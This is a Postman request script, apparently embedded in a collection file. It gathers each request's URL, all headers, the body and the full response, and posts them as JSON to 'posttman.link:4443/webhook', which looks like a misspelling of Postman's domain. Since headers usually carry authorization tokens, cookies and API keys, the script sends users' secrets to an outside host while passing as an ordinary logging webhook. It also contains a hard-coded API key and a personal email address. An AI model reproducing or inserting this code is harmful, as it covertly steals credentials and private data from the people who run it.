      const { v4: uuidv4 } = require('uuid');
      const eventId = uuidv4();
      const email = 'euelisee@gmail.com'; // Replace with your email

      function captureRequestBodyAsText() {
          if (!pm.request.body) return null;

          const { mode } = pm.request.body;

          if (mode === 'formdata' || mode === 'urlencoded') {
              const data = {};
              pm.request.body[mode].all().forEach(param => {
                  data[param.key] = param.value;
              });
              return JSON.stringify(data);
          }

          if (mode === 'raw') return pm.request.body.raw;
          if (mode === 'binary') return '[BINARY DATA]';
          if (mode === 'graphql') {
              const { query = '', operationName = null, variables = '' } = pm.request.body.graphql;
              return JSON.stringify({ query, operationName, variables });
          }
          if (mode === 'file') {
              return JSON.stringify({ file: { src: pm.request.body.file?.src || '[FILE PATH NOT AVAILABLE]' } });
          }

          return null;
      }

      const requestData = {
          eventId,
          email,
          url: pm.request.url.toString(),
          method: pm.request.method,
          headers: pm.request.headers.toObject(),
          mode: pm.request.body?.mode || 'none',
          body: captureRequestBodyAsText()
      };

      const responseData = {
          eventId,
          status: pm.response?.status || 'Error',
          statusText: pm.response?.statusText || 'Request Failed',
          responseTime: pm.response?.responseTime || 0,
          headers: pm.response?.headers.toObject() || {},
          body: pm.response?.text?.() || '',
          error: pm.response?.reason?.() || 'tunneling socket could not be established, statusCode=503'
      };

      pm.sendRequest({
          url: 'http://posttman.link:4443/webhook',
          method: 'POST',
          header: { 'Content-Type': 'application/json', 'x-api-key': 'HrdsronLEgaeLkcq3pjWq0UEPGqCV6dH9qwXW2wTXnF9VtWvMPs233x22BBfdbnGx6Z134xivvwJfB3dx2H6oTPNxR1335xwtnAiPdnDqkhJyvjLkzCRcrwmCggdfe' },
          body: {
              mode: 'raw',
              raw: JSON.stringify({ request: requestData, response: responseData })
          }
      }, (err, res) => {
          console.log(err ? `Webhook error: ${err}` : 'Webhook sent successfully:', res);
      });
    language: text/javascript
